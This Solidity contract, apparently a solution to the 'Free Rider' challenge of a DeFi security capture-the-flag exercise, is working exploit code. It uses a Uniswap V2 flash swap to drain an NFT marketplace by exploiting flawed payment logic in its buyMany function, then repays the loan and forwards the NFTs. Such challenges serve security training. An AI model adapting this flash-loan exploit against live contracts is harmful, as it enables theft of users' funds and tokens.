// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {FreeRiderNFTMarketplace} from "src/free-rider/FreeRiderNFTMarketplace.sol";

interface IWETH9 is IERC20 {
    function deposit() external payable;

    function withdraw(uint256) external;
}

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    uint256 constant AMOUNT_OF_NFTS = 6;

    IUniswapV2Pair pair;
    IWETH9 weth;
    FreeRiderNFTMarketplace marketplace;
    IERC721 nft;
    address recovery;

    constructor(
        address _pair,
        address _weth,
        address _marketplace,
        address _recovery
    ) {
        pair = IUniswapV2Pair(_pair);
        weth = IWETH9(_weth);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        nft = marketplace.token();
        recovery = _recovery;
    }

    receive() external payable {}

    function exploit(uint256 _amount) external {
        address token0 = pair.token0();
        address token1 = pair.token1();

        uint256 amount0Out = token0 == address(weth) ? _amount : 0;
        uint256 amount1Out = token1 == address(weth) ? _amount : 0;

        bytes memory dataToPair = abi.encode(address(weth), _amount);

        // flashswap for buying NFT
        pair.swap(amount0Out, amount1Out, address(this), dataToPair);

        bytes memory dataToRecovery = abi.encode(address(msg.sender));
        for (uint256 id; id < AMOUNT_OF_NFTS; id++) {
            nft.safeTransferFrom(address(this), recovery, id, dataToRecovery);
        }
        payable(msg.sender).transfer(address(this).balance);
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata data
    ) external {
        (address borrowedToken, uint256 borrowedAmount) = abi.decode(
            data,
            (address, uint256)
        );
        require(borrowedToken == address(weth));

        weth.withdraw(borrowedAmount);

        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i; i < AMOUNT_OF_NFTS; i++) {
            tokenIds[i] = i;
        }

        // buy all NFT
        marketplace.buyMany{value: borrowedAmount}(tokenIds);

        uint256 fee = ((3 * borrowedAmount) / 997) + 1;
        uint256 amountToRepay = borrowedAmount + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
